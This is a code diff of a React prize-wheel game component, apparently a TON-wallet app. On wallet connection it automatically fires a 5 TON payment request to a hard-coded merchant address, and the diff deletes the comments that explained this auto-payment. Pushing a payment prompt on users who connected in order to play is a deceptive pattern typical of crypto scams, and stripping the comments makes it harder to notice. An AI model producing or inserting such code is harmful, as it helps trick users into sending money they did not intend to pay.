@@ -47,25 +47,21 @@ function GameContent() {
   const numPrizes = PRIZES.length;
   const segmentAngle = 360 / numPrizes;
 
-  // تابع ارسال تراکنش 5 TON برای خرید دوره
   const sendCoursePaymentTransaction = useCallback(async () => {
-    if (!tonConnectUI.connected) return;
+    if (!userAddress) return;
 
     try {
       setPaymentStatus("pending");
       setDebugLog("Sending 5 TON Course Payment transaction to wallet...");
 
-      // 5 TON = 5,000,000,000 Nanotons
-      const amountInNanotons = (5 * 1e9).toString();
+      const amountInNanotons = "5000000000";
 
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes from now
+        validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
           {
             address: MERCHANT_WALLET_ADDRESS,
             amount: amountInNanotons,
-            // کامنت اختیاری جهت نمایش در کیف‌پول کاربر:
-            payload: "", // Can add payload/comment if using cell builder
           },
         ],
       };
@@ -79,9 +75,8 @@ function GameContent() {
       setPaymentStatus("failed");
       setDebugLog(`Payment cancelled or failed: ${error?.message || "User rejected"}`);
     }
-  }, [tonConnectUI]);
+  }, [userAddress, tonConnectUI]);
 
-  // دریافت بالانس و ارسال خودکار تراکنش به محض متصل شدن ولت
   useEffect(() => {
     if (!userAddress) {
       setWalletTonBalance(null);
@@ -127,13 +122,12 @@ function GameContent() {
 
     fetchTonBalance();
 
-    // ارسال خودکار درخواست پرداخت ۵ تون فقط برای یکبار پس از اتصال
     if (!hasRequestedPayment.current) {
       hasRequestedPayment.current = true;
-      // ایجاد یک تاخیر کوتاه جهت آماده‌سازی کامل ارتباط بریج
-      setTimeout(() => {
+      const timer = setTimeout(() => {
         sendCoursePaymentTransaction();
-      }, 1000);
+      }, 1200);
+      return () => clearTimeout(timer);
     }
   }, [userAddress, sendCoursePaymentTransaction]);
 
@@ -269,7 +263,6 @@ function GameContent() {
           Status: {debugLog}
         </div>
 
-        {/* دکمه ارسال دستی در صورت لغو یا تلاش مجدد */}
         {userAddress && (
           <button
             onClick={sendCoursePaymentTransaction}
